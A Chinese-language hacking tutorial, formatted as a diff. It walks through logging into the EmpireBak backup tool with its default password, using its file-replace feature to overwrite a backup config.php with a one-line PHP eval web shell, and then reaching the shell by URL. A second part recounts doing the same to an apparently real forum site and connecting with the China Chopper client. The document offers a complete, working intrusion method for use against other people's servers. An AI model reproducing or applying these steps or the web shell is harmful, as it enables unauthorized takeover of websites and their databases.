@@ -1,0 +1,38 @@
+EmpireBak是一款完全免费、专门为Mysql大数据的备份与导入而设计的软件,系统采用分卷备份与导入,理论上可备份任何大小的数据库.
+可在 http://www.phome.net/ebak2008os/ 下载到
+默认账号密码为
+admin  123456
+登陆后先备份一次数据
+备份时可选择备份到的目录。。默认有个safemod
+当然也可以是别的..这里以safemod来说了
+备份完毕后来到
+管理备份目录
+打包并下载
+把开始备份到的数据可以先下回分析..当然数据库比较大的话可以省略这一步..因为我之前下载已经分析完毕了
+备份后的safemod目录下所有的表都是以PHP保存的..Empirebak管理备份目录 下有个替换文件内容 功能
+如果你不知道要替换什么内容的话..那最好还是下载备份文件回来看下
+我是替换
+config.php的内容
+
+内容为
+01.<?php $b_table="a,bak_guest3Book1,bak_info17Content1,bak_info17Sort1,bak_info18Content1,bak_info1Content1,bak_info1Sort1,bak_info2Content1,bak_info2Sort1,bak_info4Content1,bak_info4Sort1,bak_info5Content1,bak_info5Sort1,bak_info6Content1,bak_info6Sort1,bak_info7Content1,bak_info7Sort1,bak_info8Content1,bak_info8Sort1,bak_page12Content1,bak_page1Content1,bak_page21Content1,bak_poll20Inve1,bak_poll20InveCount1,bak_poll20InveOpt1,guest16Book1,guest3Book1,htmlImage,htmlImageTmp,info10Content1,info10Sort1,info12Content1,info12Sort1,info15Content1,info15Sort1,info17Content1,info17Sort1,info18Content1,info18Sort1,info19Content1,info19Sort1,info1Content1,info1Sort1,info2Content1,info2Sort1,info4Content1,info4Sort1,info5Content1,info5Sort1,info6Content1,info6Sort1,info7Content1,info7Sort1,info8Content1,info8Sort1,operatorPower,operators,page11Content1,page12Content1,page13Content1,page14Content1,page1Content1,page21Content1,poll20Inve1,poll20InveCount1,poll20InveOpt1,poll9Inve1,poll9InveCount1,poll9InveOpt1,system"; $tb[a]=1; $tb[bak_guest3Book1]=1; $tb[bak_info17Content1]=1; $tb[bak_info17Sort1]=1; $tb[bak_info18Content1]=1; $tb[bak_info1Content1]=1; $tb[bak_info1Sort1]=1; $tb[bak_info2Content1]=1; $tb[bak_info2Sort1]=1; $tb[bak_info4Content1]=1; $tb[bak_info4Sort1]=1; $tb[bak_info5Content1]=1; $tb[bak_info5Sort1]=1; $tb[bak_info6Content1]=1; $tb[bak_info6Sort1]=1; $tb[bak_info7Content1]=1; $tb[bak_info7Sort1]=1; $tb[bak_info8Content1]=1; $tb[bak_info8Sort1]=1; $tb[bak_page12Content1]=1; $tb[bak_page1Content1]=1; $tb[bak_page21Content1]=1; $tb[bak_poll20Inve1]=1; $tb[bak_poll20InveCount1]=1; $tb[bak_poll20InveOpt1]=1; $tb[guest16Book1]=1; $tb[guest3Book1]=1; $tb[htmlImage]=1; $tb[htmlImageTmp]=1; $tb[info10Content1]=1; $tb[info10Sort1]=1; $tb[info12Content1]=1; $tb[info12Sort1]=1; $tb[info15Content1]=1; $tb[info15Sort1]=1; $tb[info17Content1]=1; $tb[info17Sort1]=1; $tb[info18Content1]=1; $tb[info18Sort1]=1; $tb[info19Content1]=1; $tb[info19Sort1]=1; $tb[info1Content1]=1; $tb[info1Sort1]=1; $tb[info2Content1]=7; $tb[info2Sort1]=1; $tb[info4Content1]=1; $tb[info4Sort1]=1; $tb[info5Content1]=1; $tb[info5Sort1]=1; $tb[info6Content1]=1; $tb[info6Sort1]=1; $tb[info7Content1]=1; $tb[info7Sort1]=1; $tb[info8Content1]=1; $tb[info8Sort1]=1; $tb[operatorPower]=1; $tb[operators]=1; $tb[page11Content1]=1; $tb[page12Content1]=1; $tb[page13Content1]=1; $tb[page14Content1]=1; $tb[page1Content1]=1; $tb[page21Content1]=1; $tb[poll20Inve1]=1; $tb[poll20InveCount1]=1; $tb[poll20InveOpt1]=1; $tb[poll9Inve1]=1; $tb[poll9InveCount1]=1; $tb[poll9InveOpt1]=1; $tb[system]=1; $b_baktype=0; $b_filesize=300; $b_bakline=500; $b_autoauf=1; $b_dbname="s422857db0"; $b_stru=1; $b_strufour=0; $b_dbchar="auto"; $b_beover=0; $b_insertf="replace"; $b_autofield=",,"; ?>
+复制代码
+
+然后替换
+
+01.<?php eval($_POST[1]);?>by huang~~~~~
+复制代码
+
+访问
+http://www.xxx.com/upload/bdata/safemod/config.php
+能看到 by huang~~~~~
+证明成功得到shell
+密码为1
+前提是要有管理密码能进入管理^_^
+————————————————————————————
+默认密码是admin    123456   带着侥幸的心情试试、、、
+我的天啊 真的进来了啊     这绝对是长相+人品啊  呵呵
+呵呵 在后台替换成功了、、
+http://bbs.xxxxt.cn/datas//bdata/safemod/config.php
+密码是1
+菜刀连上、、、嘻嘻
